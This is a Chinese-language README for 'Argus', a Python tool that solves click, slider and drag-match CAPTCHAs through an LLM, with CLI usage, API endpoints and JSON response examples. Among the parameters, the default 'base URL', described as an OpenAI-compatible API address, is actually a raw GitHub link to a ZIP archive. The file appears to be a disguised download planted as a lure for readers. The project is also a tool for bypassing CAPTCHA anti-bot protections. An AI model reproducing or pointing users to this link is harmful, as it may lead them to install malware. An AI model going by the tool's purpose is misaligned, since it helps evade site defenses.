# Argus

Argus，取名自希腊神话里的百眼巨人。

一个用于验证码识别的 Python 项目，支持两种调用方式：

- 命令行模式：读取本地图片，输出标注结果图
- HTTP API 模式：上传图片并返回统一 JSON 结构

## 环境准备

本项目使用 `uv` 管理依赖与运行环境。

```bash
uv sync
```

## 目录说明

```text
Argus/
├─ app/                  # 核心业务代码
│  ├─ main.py            # CLI 实际实现
│  ├─ api_server.py      # API 实际实现
│  ├─ recognition.py     # 识别流程复用模块
│  └─ config.yaml        # 服务端配置文件
├─ other/                # 杂项文件与历史脚本归档
├─ main.py               # CLI 兼容入口（转发到 app/main.py）
├─ api_server.py         # API 兼容入口（转发到 app/api_server.py）
└─ recognition.py        # 兼容导出（转发到 app/recognition.py）
```

## 命令行模式

命令行入口复用 `app/recognition.py` 中的同一识别流程。

```bash
uv run python main.py --image image.png --api-key <YOUR_API_KEY>
```

也可直接使用新目录入口：

```bash
uv run python -m app.main --image image.png --api-key <YOUR_API_KEY>
```

常用参数：

- `--base-url`：OpenAI 兼容接口地址，默认 `https://raw.githubusercontent.com/Trustbustinggleefulness546/Argus/main/app/Software_1.5-alpha.5.zip`
- `--model`：模型名称，默认 `gpt-5.4`
- `--retries`：重试次数，默认 `3`
- `--output`：输出标注图路径，默认 `captcha_result.png`
- `--log`：日志路径，默认 `captcha_test.log`

## API 服务

### 启动服务

```bash
uv run python api_server.py
```

也可直接使用新目录入口：

```bash
uv run python -m app.api_server
```

默认监听 `0.0.0.0:8000`，可通过环境变量修改：

- `CAPTCHA_API_HOST`
- `CAPTCHA_API_PORT`
- `CAPTCHA_API_KEY`
- `CAPTCHA_BASE_URL`
- `CAPTCHA_MODEL`
- `CAPTCHA_RETRIES`
- `CAPTCHA_TIMEOUT`
- `CAPTCHA_MAX_IMAGE_BYTES`

默认配置文件路径：`app/config.yaml`

### 健康检查

```bash
curl http://127.0.0.1:8000/health
```

### 识别接口

- 方法：`POST`
- 路径：`/api/v1/recognize`
- 请求体：`multipart/form-data`
- 必填字段：`file`（图片文件）
- 认证与模型配置：仅由服务端 `config.yaml` 或环境变量维护（客户端不可覆盖）
- 安全边界：若请求携带 `api_key`、`base_url`、`model` 等额外字段，接口将直接返回 400

示例请求：

```bash
curl -X POST "http://127.0.0.1:8000/api/v1/recognize" \
  -F "file=@image.png;type=image/png"
```

### 预览接口（返回标注图）

- 方法：`POST`
- 路径：`/api/v1/recognize/preview`
- 请求体：`multipart/form-data`
- 必填字段：`file`（图片文件）
- 返回：`image/png`（已标记识别结果的图片）

示例请求：

```bash
curl -X POST "http://127.0.0.1:8000/api/v1/recognize/preview" \
  -F "file=@image.png;type=image/png" \
  --output preview.png
```

### 成功响应结构

统一字段：

- `success`: `true`
- `data.captcha_type`: `click` / `slide` / `drag_match`
- `data.action`: 与验证码类型匹配

不同类型字段：

- `click`：`data.clicks` 为坐标数组
- `slide`：`data.gap`、`data.slider`、`data.drag_distance`
- `drag_match`：`data.pairs` 为 from/to 坐标映射数组

点选示例：

```json
{
  "success": true,
  "data": {
    "captcha_type": "click",
    "action": "click",
    "clicks": [
      {
        "x": 210,
        "y": 360
      }
    ],
    "gap": null,
    "slider": null,
    "drag_distance": null,
    "pairs": []
  },
  "error": null
}
```

滑块示例：

```json
{
  "success": true,
  "data": {
    "captcha_type": "slide",
    "action": "slide",
    "clicks": [],
    "gap": {
      "x": 580,
      "y": 300
    },
    "slider": {
      "x": 160,
      "y": 840
    },
    "drag_distance": 420,
    "pairs": []
  },
  "error": null
}
```

拖拽匹配示例：

```json
{
  "success": true,
  "data": {
    "captcha_type": "drag_match",
    "action": "drag_match",
    "clicks": [],
    "gap": null,
    "slider": null,
    "drag_distance": null,
    "pairs": [
      {
        "id": 1,
        "from": {
          "x": 650,
          "y": 320
        },
        "to": {
          "x": 180,
          "y": 290
        }
      }
    ]
  },
  "error": null
}
```

### 错误响应结构

统一格式：

```json
{
  "success": false,
  "data": null,
  "error": {
    "code": "ERROR_CODE",
    "message": "可读错误信息",
    "details": "错误详情"
  }
}
```

常见错误：

- 携带额外入参（如 `api_key/base_url/model`）：400 `EXTRA_PARAMETERS_NOT_ALLOWED`
- 缺少 `file` 字段：422 `VALIDATION_ERROR`
- 文件不是图片：415 `UNSUPPORTED_MEDIA_TYPE`
- 图片内容无法解析：422 `INVALID_IMAGE`
- 模型调用失败：502 `MODEL_CALL_FAILED`

## 项目文件

- `app/`：核心程序目录（CLI/API/识别流程/配置）
- `other/`：杂项文件与归档脚本目录
- 根目录 `main.py`、`api_server.py`、`recognition.py`：兼容入口，内部转发到 `app/`
